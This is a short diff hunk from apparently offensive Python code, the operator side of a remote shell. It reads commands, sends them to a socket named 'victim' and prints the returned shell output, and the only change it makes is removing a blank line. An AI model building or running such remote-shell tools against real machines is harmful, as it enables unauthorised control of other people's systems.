@@ -31,7 +31,6 @@ command=input('$ ')
 while command.lower() != 'quit':
     try:
         encoded_command=command.encode('utf-8')
-
         # The encoded command is sent to the victim and the output is received 
         victim.send(encoded_command)
         shell_result=victim.recv(4096).decode('utf-8')
